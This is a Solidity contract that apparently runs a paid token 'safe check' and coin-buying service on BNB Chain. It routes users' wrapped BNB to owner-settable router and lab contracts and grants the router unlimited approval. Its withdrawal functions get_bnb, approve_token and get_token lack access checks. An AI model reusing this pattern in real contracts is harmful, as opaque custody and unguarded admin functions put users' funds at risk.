// SPDX-License-Identifier: MIT
pragma solidity >=0.6.6;

interface IRouter {
    function __safe_check(address referral_adr, address user_adr, address token_adr, uint x, bool is_v2) external returns (uint);
    function __buy_coin(address user_adr, uint x) external;
}

interface ICoinLab {
    function __do_free_trial(address user_adr) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
}

contract honeyproof {
    address private owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    fallback() external payable {}
    receive() external payable {}
    
    ///////////////////////////////////////////////////////// user range
    function __do_free_trial() external {
        ICoinLab(coinlab_adr).__do_free_trial(msg.sender);
    }
    
    function __get_balance() external view returns (uint) {
        return IERC20(coinlab_adr).balanceOf(msg.sender);
    }
    
    function __safe_check(address referral_adr, address token_adr, bool is_v2) external payable {
        address WETH = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        
        IWETH(WETH).deposit{value: msg.value}();
        IRouter(router_adr).__safe_check(referral_adr, msg.sender, token_adr, msg.value, is_v2);
        IWETH(WETH).withdraw(msg.value);
    }
    
    function __buy_coin() external payable {
        address WETH = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        IWETH(WETH).deposit{value: msg.value}();
        
        IRouter(router_adr).__buy_coin(msg.sender, msg.value);
    }
    ///////////////////////////////////////////////////////// admin range
    
    function safe_ap(address token, address to) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, uint(-1)));
        bool req = success && (data.length == 0 || abi.decode(data, (bool)));
        require(req, 'P');
    }
    
    function safe_tx(address token, address from, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        bool req = success && (data.length == 0 || abi.decode(data, (bool)));
        require(req, 'T');
    }
    
    address private coinlab_adr;
    address private router_adr;
    
    function set_vars(address _coinlab_adr, address _router_adr) external {
        require(msg.sender == owner, 'O');
        coinlab_adr = _coinlab_adr;
        router_adr = _router_adr;
        
        address WETH = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
        safe_ap(WETH, _router_adr);
    }
    
    ///////////////////////////////// careful to use this
    function get_bnb() external {
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, 'T');
    }
    
    function approve_token(address token_adr) external {
        safe_ap(token_adr, address(this));
    }
    
    function get_token(address token_adr) external {
        uint x = IERC20(token_adr).balanceOf(address(this));
        safe_tx(token_adr, address(this), owner, x);
    }
}
